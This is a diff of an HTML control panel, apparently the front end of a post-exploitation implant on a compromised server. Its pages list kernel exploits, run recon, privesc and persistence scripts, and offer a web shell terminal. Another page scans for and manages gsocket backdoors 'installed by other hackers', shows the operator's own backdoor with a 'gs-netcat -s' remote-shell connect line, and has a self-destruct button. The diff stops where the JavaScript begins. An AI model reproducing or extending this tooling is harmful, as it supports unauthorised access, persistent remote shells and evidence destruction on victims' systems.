@@ -1,136 +1,86 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>DZ</title>
-<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500&display=swap" rel="stylesheet">
 <style>
-*{margin:0;padding:0;box-sizing:border-box;-webkit-font-smoothing:antialiased}
-:root{--bg:#030304;--panel:#08090c;--card:#0c0d12;--glass:rgba(255,255,255,0.01);--glass2:rgba(255,255,255,0.025);--border:rgba(255,255,255,0.04);--border2:rgba(255,255,255,0.07);--text:#9ca3af;--text2:#4b5563;--text3:#374151;--gold:#d4a012;--gold2:#b8860b;--goldGlow:rgba(212,160,18,0.12);--green:#10b981;--greenGlow:rgba(16,185,129,0.15);--red:#ef4444;--redGlow:rgba(239,68,68,0.15);--blue:#3b82f6;--cyan:#06b6d4;--purple:#8b5cf6}
-html,body{height:100%;overflow:hidden}
-body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--text);font-size:12px}
-body::before{content:'';position:fixed;inset:0;background:url("data:image/svg+xml,%3Csvg viewBox='0 0 400 400' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");opacity:.02;pointer-events:none;z-index:10000}
-body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 20% 10%,rgba(212,160,18,0.04),transparent 50%),radial-gradient(ellipse at 80% 90%,rgba(16,185,129,0.03),transparent 50%);pointer-events:none}
-
-.app{display:grid;grid-template-columns:56px 1fr 280px;height:100vh}
-.sidebar{background:var(--panel);border-right:1px solid var(--border);display:flex;flex-direction:column;align-items:center;padding:16px 0;gap:4px}
-.logo{width:32px;height:32px;background:linear-gradient(135deg,var(--gold),var(--gold2));border-radius:8px;display:flex;align-items:center;justify-content:center;font-family:'JetBrains Mono';font-weight:700;font-size:10px;color:#000;margin-bottom:20px;box-shadow:0 4px 20px var(--goldGlow)}
-.nav-item{width:40px;height:40px;display:flex;align-items:center;justify-content:center;border-radius:10px;cursor:pointer;transition:all .15s;color:var(--text2);position:relative}
-.nav-item:hover{background:var(--glass2);color:var(--text)}
-.nav-item.on{background:var(--goldGlow);color:var(--gold)}
-.nav-item.on::before{content:'';position:absolute;left:0;top:50%;transform:translateY(-50%);width:2px;height:16px;background:var(--gold);border-radius:0 2px 2px 0}
-.nav-item svg{width:18px;height:18px}
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#030304;--panel:#08090c;--card:#0c0d12;--glass:rgba(255,255,255,0.02);--border:rgba(255,255,255,0.05);--text:#9ca3af;--text2:#4b5563;--gold:#d4a012;--green:#10b981;--red:#ef4444}
+html,body{height:100%%;overflow:hidden}
+body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);font-size:12px}
+.app{display:grid;grid-template-columns:54px 1fr 260px;height:100vh}
+.sidebar{background:var(--panel);border-right:1px solid var(--border);display:flex;flex-direction:column;align-items:center;padding:14px 0;gap:4px}
+.logo{width:30px;height:30px;background:linear-gradient(135deg,var(--gold),#b8860b);border-radius:6px;display:flex;align-items:center;justify-content:center;font-family:'JetBrains Mono';font-weight:700;font-size:10px;color:#000;margin-bottom:16px}
+.nav-item{width:36px;height:36px;display:flex;align-items:center;justify-content:center;border-radius:8px;cursor:pointer;color:var(--text2);transition:all .15s}
+.nav-item:hover{background:var(--glass);color:var(--text)}
+.nav-item.on{background:rgba(212,160,18,0.1);color:var(--gold)}
+.nav-item svg{width:16px;height:16px}
 .nav-sep{width:20px;height:1px;background:var(--border);margin:8px 0}
-.nav-bottom{margin-top:auto}
-
-main{background:var(--bg);overflow-y:auto;padding:20px}
-main::-webkit-scrollbar{width:5px}
-main::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
-
-.header{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px}
-.header h1{font-size:16px;font-weight:500;color:var(--text)}
-.header h1 span{color:var(--gold)}
-.badge{display:inline-flex;align-items:center;gap:6px;padding:6px 12px;border-radius:6px;font-size:10px}
-.badge.green{background:var(--greenGlow);border:1px solid rgba(16,185,129,0.2);color:var(--green)}
-.badge.gold{background:var(--goldGlow);border:1px solid rgba(212,160,18,0.2);color:var(--gold)}
-.badge i{width:6px;height:6px;border-radius:50%;animation:pulse 2s infinite}
-.badge.green i{background:var(--green)}
-.badge.gold i{background:var(--gold)}
-@keyframes pulse{0%,100%{opacity:1;box-shadow:0 0 0 0 currentColor}50%{opacity:.5}}
-
-.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:14px}
-.grid-2{grid-template-columns:repeat(2,1fr)}
-.grid-3{grid-template-columns:repeat(3,1fr)}
-.card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:14px;position:relative;overflow:hidden}
-.card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(212,160,18,0.15),transparent)}
+main{background:var(--bg);overflow-y:auto;padding:16px}
+.header{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}
+.header h1{font-size:15px;font-weight:500}.header h1 span{color:var(--gold)}
+.badge{display:flex;align-items:center;gap:5px;background:rgba(16,185,129,0.1);border:1px solid rgba(16,185,129,0.2);padding:5px 10px;border-radius:5px;font-size:9px;color:var(--green)}
+.badge i{width:5px;height:5px;background:var(--green);border-radius:50%%;animation:pulse 2s infinite}
+@keyframes pulse{50%%{opacity:.4}}
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:12px}
+.card{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:12px}
 .card.full{grid-column:1/-1}
-.card.span-2{grid-column:span 2}
-.card-title{font-size:9px;font-weight:500;color:var(--text2);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:10px;display:flex;align-items:center;gap:6px}
-.card-title svg{width:12px;height:12px;opacity:.5}
-.card-value{font-family:'JetBrains Mono';font-size:18px;font-weight:500;color:var(--text)}
-.card-value.sm{font-size:12px}
-.card-sub{font-size:9px;color:var(--text2);margin-top:3px}
-
-.term{background:#000;border:1px solid var(--border);border-radius:8px;overflow:hidden;display:flex;flex-direction:column}
-.term-bar{background:linear-gradient(180deg,#151515,#0a0a0a);padding:8px 12px;display:flex;align-items:center;gap:6px;border-bottom:1px solid var(--border)}
-.term-dots{display:flex;gap:5px}
-.term-dots span{width:9px;height:9px;border-radius:50%}
+.card.half{grid-column:span 2}
+.card-title{font-size:8px;color:var(--text2);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px}
+.card-value{font-family:'JetBrains Mono';font-size:14px}
+.term{background:#000;border:1px solid var(--border);border-radius:6px;overflow:hidden}
+.term-bar{background:#111;padding:6px 10px;display:flex;align-items:center;gap:5px;border-bottom:1px solid var(--border)}
+.term-dots{display:flex;gap:4px}
+.term-dots span{width:8px;height:8px;border-radius:50%%}
 .term-dots span:nth-child(1){background:#ff5f57}
 .term-dots span:nth-child(2){background:#ffbd2e}
 .term-dots span:nth-child(3){background:#28ca42}
-.term-title{margin-left:auto;font-family:'JetBrains Mono';font-size:9px;color:var(--text3)}
-.term-body{font-family:'JetBrains Mono';font-size:10px;padding:10px;flex:1;overflow-y:auto;min-height:120px;max-height:260px;line-height:1.6}
-.term-body::-webkit-scrollbar{width:3px}
-.term-body::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
-.ln{margin:1px 0;padding-left:12px;position:relative;opacity:0;animation:fadeIn .12s forwards}
-.ln::before{content:'›';position:absolute;left:0;color:var(--text3);font-size:9px}
+.term-title{margin-left:auto;font-family:'JetBrains Mono';font-size:9px;color:var(--text2)}
+.term-body{font-family:'JetBrains Mono';font-size:10px;padding:10px;min-height:100px;max-height:220px;overflow-y:auto;line-height:1.5}
+.ln{margin:1px 0;padding-left:12px;position:relative}
+.ln::before{content:'>';position:absolute;left:0;color:var(--text2);font-size:8px}
 .ln.cmd{color:var(--gold)}.ln.cmd::before{content:'$';color:var(--gold)}
 .ln.ok{color:var(--green)}.ln.ok::before{content:'✓';color:var(--green)}
 .ln.err{color:var(--red)}.ln.err::before{content:'!';color:var(--red)}
-.ln.info{color:var(--text2)}
-@keyframes fadeIn{to{opacity:1}}
 .term-input{display:flex;background:#080808;border-top:1px solid var(--border)}
-.term-input input{flex:1;background:transparent;border:none;padding:10px;color:var(--text);font-family:'JetBrains Mono';font-size:10px;outline:none}
-.term-input button{background:var(--gold);color:#000;border:none;padding:0 14px;font-family:'JetBrains Mono';font-size:9px;font-weight:600;cursor:pointer}
-
-.exp{display:flex;align-items:center;padding:10px 12px;background:var(--glass);border:1px solid var(--border);border-radius:6px;margin-bottom:5px;cursor:pointer;transition:all .15s}
-.exp:hover{border-color:var(--gold);background:var(--goldGlow);transform:translateX(3px)}
-.exp-cve{font-family:'JetBrains Mono';font-size:10px;font-weight:600;width:120px;color:var(--gold)}
+.term-input input{flex:1;background:transparent;border:none;padding:8px 10px;color:var(--text);font-family:'JetBrains Mono';font-size:10px;outline:none}
+.term-input button{background:var(--gold);color:#000;border:none;padding:0 12px;font-size:9px;font-weight:600;cursor:pointer}
+.exp{display:flex;align-items:center;padding:10px;background:var(--glass);border:1px solid var(--border);border-radius:6px;margin-bottom:4px;cursor:pointer;transition:all .15s}
+.exp:hover{border-color:var(--gold);transform:translateX(2px)}
+.exp-cve{font-family:'JetBrains Mono';font-size:10px;font-weight:600;width:110px;color:var(--gold)}
 .exp-name{flex:1;font-size:10px;color:var(--text2)}
-.exp-rate{font-family:'JetBrains Mono';font-size:10px;font-weight:600;width:40px;text-align:right}
-.exp-bar{width:70px;height:3px;background:var(--glass2);border-radius:2px;margin-left:10px;overflow:hidden}
-.exp-bar i{display:block;height:100%;border-radius:2px}
-
-.gs-item{display:flex;align-items:center;padding:12px;background:var(--glass);border:1px solid var(--border);border-radius:8px;margin-bottom:8px;position:relative;overflow:hidden}
-.gs-item::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--red)}
-.gs-item.mine::before{background:var(--green)}
-.gs-info{flex:1;padding-left:12px}
-.gs-secret{font-family:'JetBrains Mono';font-size:11px;color:var(--gold);margin-bottom:4px}
-.gs-meta{font-size:9px;color:var(--text2);display:flex;gap:12px}
-.gs-actions{display:flex;gap:6px}
-
-.progress{height:2px;background:var(--glass2);border-radius:1px;overflow:hidden;margin:6px 0}
-.progress i{height:100%;background:linear-gradient(90deg,var(--gold),var(--green));border-radius:1px}
-
-.btn{background:linear-gradient(135deg,var(--gold),var(--gold2));color:#000;border:none;padding:8px 16px;border-radius:5px;font-size:10px;font-weight:600;cursor:pointer;transition:all .15s;font-family:'Inter'}
-.btn:hover{box-shadow:0 4px 15px var(--goldGlow)}
-.btn-sm{padding:5px 10px;font-size:9px}
-.btn-ghost{background:var(--glass2);border:1px solid var(--border);color:var(--text)}
-.btn-ghost:hover{border-color:var(--gold);color:var(--gold)}
-.btn-red{background:linear-gradient(135deg,var(--red),#dc2626);color:#fff}
-
-.qs{display:flex;flex-wrap:wrap;gap:5px;margin-bottom:10px}
-.qs span{padding:7px 12px;background:var(--glass);border:1px solid var(--border);border-radius:5px;font-size:9px;color:var(--text2);cursor:pointer;transition:all .12s;font-family:'JetBrains Mono'}
-.qs span:hover{border-color:var(--gold);color:var(--gold);background:var(--goldGlow)}
-
+.exp-rate{font-family:'JetBrains Mono';font-size:10px;width:35px;text-align:right}
+.exp-bar{width:60px;height:3px;background:var(--glass);border-radius:2px;margin-left:8px;overflow:hidden}
+.exp-bar i{display:block;height:100%%;border-radius:2px}
+.gs-item{display:flex;align-items:center;padding:10px;background:var(--glass);border:1px solid var(--border);border-radius:6px;margin-bottom:6px;border-left:3px solid var(--red)}
+.gs-item.mine{border-left-color:var(--green)}
+.gs-info{flex:1}
+.gs-secret{font-family:'JetBrains Mono';font-size:10px;color:var(--gold)}
+.gs-meta{font-size:9px;color:var(--text2);margin-top:3px}
+.btn{background:linear-gradient(135deg,var(--gold),#b8860b);color:#000;border:none;padding:7px 14px;border-radius:4px;font-size:9px;font-weight:600;cursor:pointer}
+.btn-sm{padding:5px 8px;font-size:8px}
+.btn-ghost{background:var(--glass);border:1px solid var(--border);color:var(--text)}
+.btn-red{background:var(--red);color:#fff}
+.qs{display:flex;flex-wrap:wrap;gap:4px}
+.qs span{padding:6px 10px;background:var(--glass);border:1px solid var(--border);border-radius:4px;font-size:9px;color:var(--text2);cursor:pointer}
+.qs span:hover{border-color:var(--gold);color:var(--gold)}
 .page{display:none}.page.on{display:block}
-
-.rsb{background:var(--panel);border-left:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden}
-.rsb-head{padding:14px;border-bottom:1px solid var(--border)}
-.rsb-head h3{font-size:9px;font-weight:500;color:var(--text2);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:8px}
-.fm-path{font-family:'JetBrains Mono';font-size:9px;display:flex;flex-wrap:wrap;gap:3px;color:var(--text2)}
+.rsb{background:var(--panel);border-left:1px solid var(--border);padding:12px;overflow-y:auto}
+.rsb h3{font-size:9px;color:var(--text2);text-transform:uppercase;letter-spacing:1px;margin-bottom:10px}
+.fm-path{font-family:'JetBrains Mono';font-size:9px;color:var(--text2);margin-bottom:8px}
 .fm-path a{color:var(--gold);text-decoration:none}
-.rsb-body{flex:1;overflow-y:auto;padding:6px}
-.rsb-body::-webkit-scrollbar{width:3px}
-.rsb-body::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
-.fm-item{display:flex;align-items:center;padding:8px;border-radius:6px;cursor:pointer;transition:all .1s;margin-bottom:1px}
-.fm-item:hover{background:var(--glass2)}
-.fm-icon{width:26px;height:26px;display:flex;align-items:center;justify-content:center;background:var(--glass2);border-radius:5px;margin-right:8px;font-size:12px}
+.fm-item{display:flex;align-items:center;padding:7px;border-radius:5px;cursor:pointer;margin-bottom:1px}
+.fm-item:hover{background:var(--glass)}
+.fm-icon{width:24px;height:24px;display:flex;align-items:center;justify-content:center;background:var(--glass);border-radius:4px;margin-right:8px;font-size:11px}
 .fm-icon.dir{background:rgba(212,160,18,0.1)}
-.fm-info{flex:1;min-width:0}
-.fm-name{font-size:10px;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.fm-meta{font-family:'JetBrains Mono';font-size:8px;color:var(--text3);margin-top:2px}
-.fm-preview{background:var(--card);border:1px solid var(--border);border-radius:6px;margin:6px;padding:10px;max-height:140px;overflow:auto;font-family:'JetBrains Mono';font-size:9px;line-height:1.5;white-space:pre-wrap;word-break:break-all;color:var(--text2)}
-
-.key-box{background:#000;border:1px solid var(--border);border-radius:5px;padding:12px;font-family:'JetBrains Mono';font-size:10px;color:var(--gold);word-break:break-all;cursor:pointer;transition:all .15s}
-.key-box:hover{border-color:var(--gold)}
-.key-box:active{background:var(--goldGlow)}
-
-.live-stats{display:grid;grid-template-columns:repeat(2,1fr);gap:6px}
-.live-stat{background:var(--glass);border-radius:5px;padding:8px}
-.live-stat-label{font-size:8px;color:var(--text3);text-transform:uppercase;margin-bottom:3px}
-.live-stat-value{font-family:'JetBrains Mono';font-size:13px;color:var(--text)}
-.live-stat-bar{height:2px;background:var(--glass2);border-radius:1px;margin-top:5px;overflow:hidden}
-.live-stat-bar i{height:100%;border-radius:1px;transition:width .4s}
-
-.realtime{position:absolute;top:14px;right:14px;display:flex;align-items:center;gap:5px;font-size:8px;color:var(--green)}
-.realtime i{width:4px;height:4px;background:var(--green);border-radius:50%;animation:pulse 1s infinite}
+.fm-name{font-size:10px;flex:1}
+.fm-size{font-size:8px;color:var(--text2)}
+.key-box{background:#000;border:1px solid var(--border);border-radius:4px;padding:10px;font-family:'JetBrains Mono';font-size:9px;color:var(--gold);word-break:break-all;cursor:pointer}
+.live-stats{display:grid;grid-template-columns:1fr 1fr;gap:6px}
+.live-stat{background:var(--glass);border-radius:4px;padding:8px}
+.live-stat-label{font-size:8px;color:var(--text2);margin-bottom:2px}
+.live-stat-value{font-family:'JetBrains Mono';font-size:12px}
+.live-bar{height:2px;background:var(--border);border-radius:1px;margin-top:4px;overflow:hidden}
+.live-bar i{height:100%%;border-radius:1px}
+.progress{height:2px;background:var(--border);border-radius:1px;margin:6px 0;overflow:hidden}
+.progress i{height:100%%;background:linear-gradient(90deg,var(--gold),var(--green))}
 </style></head>
 <body>
 <div class="app">
@@ -142,200 +92,68 @@ main::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
 <div class="nav-item" data-p="term" title="Terminal"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg></div>
 <div class="nav-sep"></div>
 <div class="nav-item" data-p="gs" title="GSockets"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div>
-<div class="nav-item" data-p="proc" title="Processes"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg></div>
-<div class="nav-item" data-p="net" title="Network"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/></svg></div>
-<div class="nav-bottom">
-<div class="nav-sep"></div>
-<div class="nav-item" data-p="cfg" title="Config"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 00.33 1.82l.06.06a2 2 0 010 2.83 2 2 0 01-2.83 0l-.06-.06a1.65 1.65 0 00-1.82-.33 1.65 1.65 0 00-1 1.51V21a2 2 0 01-4 0v-.09A1.65 1.65 0 009 19.4a1.65 1.65 0 00-1.82.33l-.06.06a2 2 0 01-2.83-2.83l.06-.06a1.65 1.65 0 00.33-1.82 1.65 1.65 0 00-1.51-1H3a2 2 0 010-4h.09A1.65 1.65 0 004.6 9a1.65 1.65 0 00-.33-1.82l-.06-.06a2 2 0 012.83-2.83l.06.06a1.65 1.65 0 001.82.33H9a1.65 1.65 0 001-1.51V3a2 2 0 114 0v.09a1.65 1.65 0 001 1.51 1.65 1.65 0 001.82-.33l.06-.06a2 2 0 012.83 2.83l-.06.06a1.65 1.65 0 00-.33 1.82V9a1.65 1.65 0 001.51 1H21a2 2 0 010 4h-.09a1.65 1.65 0 00-1.51 1z"/></svg></div>
+<div class="nav-item" data-p="proc" title="Processes"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/></svg></div>
+<div class="nav-item" data-p="net" title="Network"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/></svg></div>
+<div style="margin-top:auto"><div class="nav-sep"></div>
+<div class="nav-item" data-p="cfg" title="Config"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M12 1v6m0 6v10M4.2 4.2l4.2 4.2m7.2 7.2l4.2 4.2M1 12h6m6 0h10M4.2 19.8l4.2-4.2m7.2-7.2l4.2-4.2"/></svg></div>
 <div class="nav-item" onclick="nuke()" title="Destruct" style="color:var(--red)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg></div>
 </div>
 </nav>
-
 <main>
 <div id="p-dash" class="page on">
-<div class="header"><h1>System <span>Overview</span></h1><div class="badge green"><i></i>Online</div></div>
+<div class="header"><h1>System <span>Overview</span></h1><div class="badge"><i></i>Online</div></div>
 <div class="grid">
-<div class="card"><div class="card-title">Kernel</div><div class="card-value sm" id="s_kernel">-</div></div>
-<div class="card"><div class="card-title">User</div><div class="card-value sm" id="s_user">-</div><div class="card-sub" id="s_uid"></div></div>
-<div class="card"><div class="card-title">Uptime</div><div class="card-value sm" id="s_uptime">-</div></div>
-<div class="card"><div class="card-title">Memory</div><div class="card-value sm" id="s_mem">-</div></div>
+<div class="card"><div class="card-title">Kernel</div><div class="card-value" id="s_kernel">-</div></div>
+<div class="card"><div class="card-title">User</div><div class="card-value" id="s_user">-</div></div>
+<div class="card"><div class="card-title">Uptime</div><div class="card-value" id="s_up">-</div></div>
+<div class="card"><div class="card-title">Memory</div><div class="card-value" id="s_mem">-</div></div>
 </div>
-<div class="grid grid-2">
-<div class="card" style="position:relative"><div class="realtime"><i></i>LIVE</div><div class="card-title">Resources</div><div class="live-stats" id="live"></div></div>
-<div class="card"><div class="card-title">Quick</div><div class="qs"><span onclick="nav('exp')">⚡ Exploits</span><span onclick="nav('gs')">🛡 GSockets</span><span onclick="nav('term')">▸ Shell</span><span onclick="pull()">↻ Update</span></div></div>
+<div class="grid" style="grid-template-columns:1fr 1fr">
+<div class="card"><div class="card-title">Resources</div><div class="live-stats" id="live"></div></div>
+<div class="card"><div class="card-title">Quick</div><div class="qs"><span onclick="nav('exp')">⚡Exploits</span><span onclick="nav('gs')">🛡GSocket</span><span onclick="nav('term')">▸Shell</span><span onclick="pull()">↻Update</span></div></div>
 </div>
 <div class="card full"><div class="card-title">Vulnerability Scan</div><div id="scan"></div></div>
 </div>
-
-<div id="p-exp" class="page">
-<div class="header"><h1>Kernel <span>Exploits</span></h1></div>
-<div class="card"><div id="expl" style="max-height:calc(100vh - 180px);overflow-y:auto"></div></div>
-</div>
-
-<div id="p-scr" class="page">
-<div class="header"><h1>Script <span>Runner</span></h1></div>
-<div class="card">
-<div class="qs"><span onclick="rs('scripts/sysinfo.sh')">sysinfo</span><span onclick="rs('scripts/recon.sh')">recon</span><span onclick="rs('scripts/privesc.sh')">privesc</span><span onclick="rs('scripts/persist.sh')">persist</span></div>
-<div style="display:flex;gap:6px;margin-top:10px"><input id="sp" style="flex:1;background:var(--glass);border:1px solid var(--border);padding:10px;border-radius:5px;color:var(--text);font-family:'JetBrains Mono';font-size:10px;outline:none" placeholder="scripts/custom.sh"><button class="btn" onclick="rs($('sp').value)">Run</button></div>
-</div>
-<div class="card" style="margin-top:12px"><div class="term" style="height:320px"><div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">output</div></div><div class="term-body" id="so" style="max-height:270px"></div></div></div>
-</div>
-
-<div id="p-term" class="page">
-<div class="header"><h1>Shell <span>Terminal</span></h1></div>
-<div class="card"><div class="term" style="height:calc(100vh - 160px)"><div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">bash</div></div><div class="term-body" id="to" style="max-height:calc(100vh - 260px)"></div><div class="term-input"><input id="tc" placeholder="$ command" onkeydown="event.key==='Enter'&&rc()"><button onclick="rc()">EXEC</button></div></div></div>
-</div>
-
-<div id="p-gs" class="page">
-<div class="header"><h1>GSSocket <span>Scanner</span></h1><button class="btn btn-sm" onclick="scanGS()">🔍 Scan Now</button></div>
-<div class="card"><div class="card-title">Detected GSockets</div><p style="font-size:10px;color:var(--text2);margin-bottom:12px">Find and manage gsocket backdoors installed by other hackers</p><div id="gslist"></div></div>
-<div class="card" style="margin-top:12px"><div class="card-title">Your GSocket</div><div class="gs-item mine"><div class="gs-info"><div class="gs-secret" id="mygs">%s</div><div class="gs-meta"><span>🔒 Your backdoor</span><span>Active</span></div></div></div><p style="font-size:9px;color:var(--text2);margin-top:10px">Connect: <code style="color:var(--gold)">gs-netcat -s %s</code></p></div>
-</div>
-
-<div id="p-proc" class="page">
-<div class="header"><h1>Process <span>Monitor</span></h1><div class="badge gold" style="cursor:pointer" onclick="loadProc()"><i></i>Refresh</div></div>
-<div class="card"><div class="term" style="height:calc(100vh - 160px)"><div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">ps aux</div></div><div class="term-body" id="po" style="max-height:calc(100vh - 230px)"></div></div></div>
-</div>
-
-<div id="p-net" class="page">
-<div class="header"><h1>Network <span>Info</span></h1><div class="badge gold" style="cursor:pointer" onclick="loadNet()"><i></i>Refresh</div></div>
-<div class="card"><div class="term" style="height:calc(100vh - 160px)"><div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">connections</div></div><div class="term-body" id="no" style="max-height:calc(100vh - 230px)"></div></div></div>
-</div>
-
-<div id="p-cfg" class="page">
-<div class="header"><h1>Configuration</h1></div>
-<div class="grid grid-2">
-<div class="card"><div class="card-title">Deploy Key</div><div class="key-box" onclick="copy(this)">%s</div></div>
-<div class="card"><div class="card-title">Tunnel URL</div><div class="key-box" id="urlbox" onclick="copy(this)">%s</div></div>
-</div>
-<div class="card" style="margin-top:12px"><div class="card-title">Actions</div><div style="display:flex;gap:8px;flex-wrap:wrap"><button class="btn" onclick="pull()">↻ Update Repo</button><button class="btn btn-ghost" onclick="rc2('id;pwd')">Check ID</button><button class="btn btn-red" onclick="nuke()">☠ Destruct</button></div></div>
-</div>
+<div id="p-exp" class="page"><div class="header"><h1>Kernel <span>Exploits</span></h1></div><div class="card"><div id="expl"></div></div></div>
+<div id="p-scr" class="page"><div class="header"><h1>Script <span>Runner</span></h1></div><div class="card"><div class="qs" style="margin-bottom:10px"><span onclick="rs('scripts/sysinfo.sh')">sysinfo</span><span onclick="rs('scripts/recon.sh')">recon</span><span onclick="rs('scripts/privesc.sh')">privesc</span></div><div style="display:flex;gap:6px"><input id="sp" style="flex:1;background:var(--glass);border:1px solid var(--border);padding:8px;border-radius:4px;color:var(--text);font-family:'JetBrains Mono';font-size:10px" placeholder="scripts/x.sh"><button class="btn" onclick="rs($('sp').value)">Run</button></div></div><div class="card" style="margin-top:10px"><div class="term"><div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">output</div></div><div class="term-body" id="so"></div></div></div></div>
+<div id="p-term" class="page"><div class="header"><h1>Shell</h1></div><div class="card"><div class="term" style="height:calc(100vh - 140px)"><div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">bash</div></div><div class="term-body" id="to" style="max-height:calc(100vh - 220px)"></div><div class="term-input"><input id="tc" placeholder="$ command" onkeydown="event.key==='Enter'&&rc()"><button onclick="rc()">RUN</button></div></div></div></div>
+<div id="p-gs" class="page"><div class="header"><h1>GSSocket <span>Scanner</span></h1><button class="btn btn-sm" onclick="scanGS()">Scan</button></div><div class="card"><div class="card-title">Detected</div><div id="gslist"></div></div><div class="card" style="margin-top:10px"><div class="card-title">Your GSocket</div><div class="gs-item mine"><div class="gs-info"><div class="gs-secret" id="mygs">%s</div><div class="gs-meta">Connect: gs-netcat -s %s</div></div></div></div></div>
+<div id="p-proc" class="page"><div class="header"><h1>Processes</h1><button class="btn btn-sm" onclick="loadProc()">Refresh</button></div><div class="card"><div class="term"><div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">ps</div></div><div class="term-body" id="po" style="max-height:400px"></div></div></div></div>
+<div id="p-net" class="page"><div class="header"><h1>Network</h1><button class="btn btn-sm" onclick="loadNet()">Refresh</button></div><div class="card"><div class="term"><div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">connections</div></div><div class="term-body" id="no" style="max-height:400px"></div></div></div></div>
+<div id="p-cfg" class="page"><div class="header"><h1>Config</h1></div><div class="grid" style="grid-template-columns:1fr 1fr"><div class="card"><div class="card-title">Deploy Key</div><div class="key-box" onclick="this.style.borderColor='var(--green)';navigator.clipboard.writeText(this.innerText)">%s</div></div><div class="card"><div class="card-title">URL</div><div class="key-box" onclick="this.style.borderColor='var(--green)';navigator.clipboard.writeText(this.innerText)">%s</div></div></div><div class="card" style="margin-top:10px"><div style="display:flex;gap:6px"><button class="btn" onclick="pull()">Update</button><button class="btn btn-ghost" onclick="rc2('id')">ID</button><button class="btn btn-red" onclick="nuke()">Destruct</button></div></div></div>
 </main>
-
 <div class="rsb">
-<div class="rsb-head"><h3>Files</h3><div class="fm-path" id="bc"></div></div>
-<div class="rsb-body" id="fls"></div>
-<div id="fpreview"></div>
+<h3>Files</h3>
+<div class="fm-path" id="bc"></div>
+<div id="fls"></div>
 </div>
 </div>
-
 <script>
 const $=s=>document.getElementById(s);
-const api=async(e,d)=>{try{return(await fetch('/api/'+e,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d||{})})).json();}catch(e){return{error:e.message}}};
-const log=(el,t,c='')=>{const d=document.createElement('div');d.className='ln '+c;d.textContent=t;$(el)?.appendChild(d);$(el).scrollTop=1e9;};
-const clear=el=>{if($(el))$(el).innerHTML='';};
-const copy=el=>{navigator.clipboard.writeText(el.innerText);el.style.borderColor='var(--green)';setTimeout(()=>el.style.borderColor='',500);};
+const api=async(e,d)=>{try{return(await fetch('/api/'+e,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d||{})})).json();}catch(x){return{error:x}}};
+const log=(el,t,c)=>{if(!$(el))return;const d=document.createElement('div');d.className='ln '+(c||'');d.textContent=t;$(el).appendChild(d);$(el).scrollTop=1e9;};
